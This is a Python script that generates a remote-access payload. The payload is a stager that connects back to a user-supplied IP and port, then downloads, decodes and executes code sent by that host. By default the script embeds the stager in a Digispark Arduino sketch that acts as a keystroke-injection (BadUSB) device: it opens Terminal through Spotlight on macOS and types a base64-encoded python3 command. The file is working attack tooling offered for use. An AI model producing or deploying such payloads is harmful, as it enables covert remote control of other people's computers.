import argparse
import sys
import base64 

CURLY_L = "{"
CURLY_R = "}"

def write_file(filename, content):
  with open(filename, "w") as out:
    out.write(content)
  print("File written as " + filename)

parser = argparse.ArgumentParser()

try:
  sys.argv[1]
except:
  print(
    "usage: -i ip address to connect to\n"
    "usage: -p port number\n"
    "usage: -py True, only generates python payload -- optional flag"
    "usage: -h show help"
  )

parser.add_argument("-i", "--ipaddress", help="IP address")
parser.add_argument("-p", "--port", help="Port number")
parser.add_argument("-py", "--python", help="only generates python payload")

args = parser.parse_args()
if(args.ipaddress and args.port):    
  IP_ADDRESS = args.ipaddress
  PORT = args.port
else:
  print("Missing option(s). -h for more help.")
  exit()

#options received
print(IP_ADDRESS)
print(PORT)
PARTIAL = "'s':s"

payload = f"import socket,zlib,base64,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('{IP_ADDRESS}',{PORT}))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(zlib.decompress(base64.b64decode(d)),{{{PARTIAL}}})\n"

if(args.python):
  write_file("d.py", payload)

else: #generate Arduino sketch
  INITIAL_DELAY = 700
  PAYLOAD_BYTES = payload.encode("ascii")
  ENCODED_BYTES = base64.b64encode(PAYLOAD_BYTES)
  ENCODED_PAYLOAD = ENCODED_BYTES.decode("ascii") #encoded payload to be loaded in Ardiono file
  ARDUINO_SKETCH_LOOP = f"\n\tDigiKeyboard.delay({INITIAL_DELAY});\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print(\"Terminal\");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print(\"python3 -c \\\"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\\\"\");\n\tfor(;;){CURLY_L}{CURLY_R}\n"
  ARDIONO_FILE_CONTENT = f"#include \"DigiKeyboard.h\"\n\nvoid setup() {CURLY_L}{CURLY_R}\n\nvoid loop() {CURLY_L}{ARDUINO_SKETCH_LOOP}{CURLY_R}\n"
  write_file("digispark_sketch.ino", ARDIONO_FILE_CONTENT)


  

  # \tDigiKeyboard.delay(1000);\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print("Terminal");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print("python3 -c \"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\"");\n\tfor(;;){ /*empty*/ }\n